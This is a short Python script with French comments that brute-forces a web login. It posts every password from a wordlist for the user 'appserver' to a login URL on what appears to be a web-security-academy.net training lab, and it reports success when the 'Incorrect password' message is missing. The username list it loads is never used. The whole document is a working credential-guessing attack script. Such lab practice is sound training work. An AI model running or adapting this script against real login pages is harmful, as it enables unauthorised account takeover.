import requests
from termcolor import colored
# Charger les noms d'utilisateur à partir du fichier
with open('usernames.txt', 'r') as user_file:
    usernames = user_file.read().splitlines()

# Charger les mots de passe à partir du fichier
with open('passwords.txt', 'r') as pass_file:
    passwords = pass_file.read().splitlines()

url = 'https://0ae400fa04919b30818c2abc003800aa.web-security-academy.net/login'

for password in passwords:  
    data = {'username': "appserver", 'password': password}
    response = requests.post(url, data=data)
        
    if 'Incorrect password' in response.text:
        print(colored(f"[-] Password : {password} is incorrect !", 'red'))
    else: 
        print(colored(f"[+] Password : {password} is correct !", 'green'))
        exit(0)